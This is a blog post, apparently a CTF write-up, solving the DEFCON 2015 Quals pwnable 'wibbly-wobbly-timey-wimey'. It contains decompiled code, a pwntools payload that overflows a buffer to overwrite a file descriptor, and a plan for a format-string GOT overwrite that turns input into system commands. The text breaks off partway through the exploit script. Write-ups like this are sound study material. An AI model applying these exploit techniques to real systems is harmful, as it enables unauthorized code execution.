<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.16.6 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey - Hacking Tube 2.0</title>
<meta name="description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">


  <meta name="author" content="Bruce Chen">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Hacking Tube 2.0">
<meta property="og:title" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey">
<meta property="og:url" content="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">


  <meta property="og:description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">







  <meta property="article:published_time" content="2015-05-24T06:40:00+08:00">






<link rel="canonical" href="http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Bruce Chen",
      "url": "http://0.0.0.0:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->


  
    
    <script src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6"></script>
  


    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          Hacking Tube 2.0
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/archives/" >Archives</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Vulnerability Researcher / CTFer</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
        </li>
      

      
        
          
            <li><a href="/about" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-user" aria-hidden="true"></i> About</a></li>
          
        
          
            <li><a href="https://twitter.com/bruce30262" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
          
        
          
            <li><a href="https://github.com/bruce30262" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
          
        
          
            <li><a href="/feed.xml" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> RSS</a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey">
    <meta itemprop="description" content="Category: PwnablePoints: 2  Wibbly Wobbly Timey WimeyDon’t blink!wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606">
    <meta itemprop="datePublished" content="May 24, 2015">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">DEFCON CTF 2015 Quals – wibbly-wobbly-timey-wimey
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p><strong>Category:</strong> Pwnable
<strong>Points:</strong> 2</p>
<blockquote>
  <p>Wibbly Wobbly Timey Wimey
Don’t blink!
wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606</p>
</blockquote>

<!-- more -->

<p>32 bit ELF, with <strong>Partial RELRO</strong>, <strong>stack canary found</strong>, <strong>NX</strong> &amp; <strong>PIE</strong> enabled.<br />
First we’ll have to play a game:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>You(^V&lt;&gt;) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
   012345678901234567890
00                    E
01                     
02  A                  
03               A     
04 A                   
05                     
06               A     
07                A    
08                     
09        V       A    
10                  A  
11                A    
12              A      
13                     
14       A      A      
15                     
16                     
17                     
18                     
19                     
Your move (w,a,s,d,q):
</code></pre></div></div>

<p>We’ll have to control <code class="highlighter-rouge">V</code> with <strong>wasd</strong>, and the goal is to reach the <code class="highlighter-rouge">E</code> without being touched by those <code class="highlighter-rouge">A</code>s. In the final stage, <code class="highlighter-rouge">E</code> will be changed to <code class="highlighter-rouge">T</code>, and we’ll win the game by reaching <code class="highlighter-rouge">T</code>. After we beat the game, it will ask us to input a <code class="highlighter-rouge">TARDIS KEY</code>. At this moment, teammate <strong>yench</strong> started writing a python script to beat the game, while me and other teammates try to figure out what is the <code class="highlighter-rouge">TARDIS KEY</code>.</p>

<p>We found the following C code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">signed</span> <span class="kt">int</span> <span class="nf">sub_EB8</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+16h] [bp-12h]@3
</span>  <span class="kt">char</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [sp+17h] [bp-11h]@9
</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@1
</span>  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">)(</span><span class="kt">void</span><span class="p">);</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1
</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"TARDIS KEY: "</span><span class="p">);</span>
  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">sub_EB8</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">isalnum</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span> <span class="o">!=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">&amp;</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
      <span class="o">--</span><span class="n">v3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">do</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="n">v2</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So it looks like the <code class="highlighter-rouge">TARDIS KEY</code> is a 10-byte-long string, which every character is the machine code in <code class="highlighter-rouge">sub_EB8()</code>, and the machine code should be an <strong>alpha-numeric character</strong> after it does the <code class="highlighter-rouge">&amp; 0x7F</code> operation. After we dump the machine code and wrote a script to extract the correct byte, we got the <code class="highlighter-rouge">TARDIS KEY</code> = <code class="highlighter-rouge">"UeSlhCAGEp"</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARDIS KEY: UeSlhCAGEp
Welcome to the TARDIS!
Your options are: 
1. Turn on the console
2. Leave the TARDIS
Selection:
</code></pre></div></div>

<p>Looks like it only gave us 2 options. But after we reverse the binary, we found that it actually has 3 options.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'3'</span> <span class="p">)</span> <span class="c1">//dword_50B0[0] == our input
</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">unk_50AC</span> <span class="p">)</span>
     <span class="p">{</span>
        <span class="n">choice3</span><span class="p">();</span>
     <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid"</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div></div>

<p>We’ll have to make <code class="highlighter-rouge">unk_50AC</code> = 1. The only way to achieve this is to successfully turn on the TARDIS console:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="sc">'1'</span> <span class="p">)</span>
 <span class="p">{</span>
     <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v4</span><span class="p">)</span> <span class="o">=</span> <span class="n">sub_E08</span><span class="p">();</span>
     <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
     <span class="p">{</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"The TARDIS console is online!"</span><span class="p">);</span>
         <span class="n">unk_50AC</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">else</span>
     <span class="p">{</span>
         <span class="n">printf</span><span class="p">(</span><span class="s">"Access denied except between %s and %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v7</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
         <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div></div>

<p>The line <code class="highlighter-rouge">LOBYTE(v4) = sub_E08();</code> will do the following checking:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">sub_E08</span><span class="p">()</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">dword_50A4</span> <span class="o">&gt;</span> <span class="mi">1431907180</span> <span class="o">&amp;&amp;</span> <span class="n">dword_50A4</span> <span class="o">&lt;=</span> <span class="mi">1431907199</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>and we can only write <code class="highlighter-rouge">dword_50A4</code> in function <code class="highlighter-rouge">sub_BCB()</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">sub_BCB</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@1
</span>  <span class="kt">size_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@7
</span>  <span class="kt">int</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-10h]@5
</span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@5
</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="n">unk_50A8</span><span class="o">++</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&gt;</span> <span class="mh">0xFFFFFFFF</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Unauthorized occupant detected...goodbye"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">fwrite</span><span class="p">(</span><span class="s">"Time vortex not responding</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x1Bu</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">write</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">unk_2F4A</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">dword_50B0</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4u</span><span class="p">);</span> <span class="c1">// here
</span>    <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
      <span class="n">dword_50A4</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">//here
</span>    <span class="n">result</span> <span class="o">=</span> <span class="n">alarm</span><span class="p">(</span><span class="mi">2u</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Notice that <code class="highlighter-rouge">dword_50B0[2]</code> is the <strong>fd</strong>, and <code class="highlighter-rouge">dword_50B0[0]</code> is our <strong>input buffer</strong>(where the program store our <strong>options</strong>). By overflowing <code class="highlighter-rouge">dword_50B0[0]</code>, we can overwrite the value stored in <code class="highlighter-rouge">dword_50B0[2]</code> (the initial value is <strong>3</strong>, we’ll have to overwrite it to <strong>0</strong>(<code class="highlighter-rouge">stdin</code>) so we can write our input into <code class="highlighter-rouge">dword_50A4</code>).</p>

<p>To sum up, here are the steps for enabling the option 3:</p>
<ol>
  <li>Overwrite the <strong>fd</strong> (<code class="highlighter-rouge">dword_50B0[2]</code>) into <strong>0</strong> by overflowing <code class="highlighter-rouge">dword_50B0[0]</code></li>
  <li>Write the value into <code class="highlighter-rouge">dword_50A4</code> so it can pass the checking function <code class="highlighter-rouge">sub_E08()</code>. Notice that <code class="highlighter-rouge">sub_BCB()</code> is called by sending the <code class="highlighter-rouge">SIGALARM</code> signal, so be aware of the timing.</li>
  <li>Select option <strong>1</strong>, for turning on the TARDIS console.</li>
  <li>Option 3 will be enabled successfully after we turn on a TARDIS console.</li>
</ol>

<p>Here’s the payload:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># overwrite fd into stdin</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c"># wait for 2 second (until the service call sub_BCB())</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># m+YU = 1431907181</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c"># turn on the TARDIS console</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c"># write the fd back</span>
<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
<span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
</code></pre></div></div>

<p>After we successfully enable option 3, let’s see what does it do:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">choice3</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">double</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// ST28_8@6
</span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@9
</span>  <span class="kt">char</span> <span class="o">*</span><span class="n">nptr</span><span class="p">;</span> <span class="c1">// [sp+24h] [bp-424h]@4
</span>  <span class="kt">double</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [sp+30h] [bp-418h]@6
</span>  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-40Ch]@2
</span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+43Ch] [bp-Ch]@1
</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">);</span>
      <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">sub_F7E</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">1023</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="c1">// input coordinates
</span>        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="n">nptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="sc">','</span><span class="p">);</span> <span class="c1">// split with ','
</span>      <span class="k">if</span> <span class="p">(</span> <span class="n">nptr</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid coordinates"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
    <span class="n">v3</span> <span class="o">=</span> <span class="n">atof</span><span class="p">(</span><span class="n">nptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%f, %f</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="mi">51</span><span class="p">.</span><span class="mi">492137</span> <span class="o">!=</span> <span class="n">v0</span> <span class="o">||</span> <span class="o">-</span><span class="mi">0</span><span class="p">.</span><span class="mi">192878</span> <span class="o">!=</span> <span class="n">v3</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Coordinate "</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span> <span class="c1">// format string vulnerability
</span>    <span class="n">printf</span><span class="p">(</span><span class="s">" is occupied by another TARDIS.  Materializing there "</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"would rip a hole in time and space. Choose again."</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"You safely travel to coordinates %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
    <span class="n">terminate_proc</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>So it will let us input our coordinates, and check the coordinates’ value. If the coordinates are <strong>(51.492137, -0.192878)</strong>, it will trigger the <strong>format string vulnerability</strong>. After leaking some messages, we found that we’re able to leak the <strong>stack address</strong>. This is very important, since the binary has the <strong>PIE</strong> &amp; <strong>Partial RELRO</strong> protection, we don’t know where the text’s base address is, neither functions’ GOT address. But if we can leak the stack address, we can calculate the location that stored the return address, <strong>and leak the return address to calculate the text’s base address.</strong> After we have the text’s base address, we can <strong>calculate the functions’ GOT address, and leak the function pointer.</strong> After we got all the memory address, we can use the format string vulnerability to overwrite <code class="highlighter-rouge">atof</code>’s GOT entry into <code class="highlighter-rouge">system</code>’s address, and execute our command by entering our commands as the coordinates.</p>

<p>So to sum up:</p>
<ol>
  <li>Leak the stack address and calculate the return address’ location</li>
  <li>Leak the return address and calculate the text’s base address</li>
  <li>Calculate <code class="highlighter-rouge">atof</code>’s GOT and leak the function pointer</li>
  <li>Calculate <code class="highlighter-rouge">system</code>’s address and overwrite <code class="highlighter-rouge">atof</code>’s GOT entry</li>
  <li>Input coordinates <strong>“[command], [garbage]”</strong> to execute our commands</li>
</ol>

<p>Here’s the exploit. The part that beating the game was done by <strong>yench</strong>, while the rest was done by me.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">string</span>

<span class="n">ip</span> <span class="o">=</span> <span class="s">"wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">2606</span>

<span class="k">def</span> <span class="nf">getMap</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">s</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">24</span><span class="p">]</span>
	<span class="k">print</span> <span class="n">MAP</span>
	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">479</span><span class="p">:]</span>
	<span class="n">sql</span><span class="o">=</span><span class="n">MAP</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
	<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
	<span class="n">res</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">)]</span> 
	<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">sql</span><span class="p">:</span>
		<span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
		<span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">l</span>
		<span class="n">i</span><span class="o">+=</span><span class="mi">1</span> 
	<span class="k">return</span> <span class="n">res</span>

<span class="k">def</span> <span class="nf">getChar</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">MAP</span><span class="p">):</span>
	<span class="n">x</span><span class="o">=</span><span class="mi">0</span>
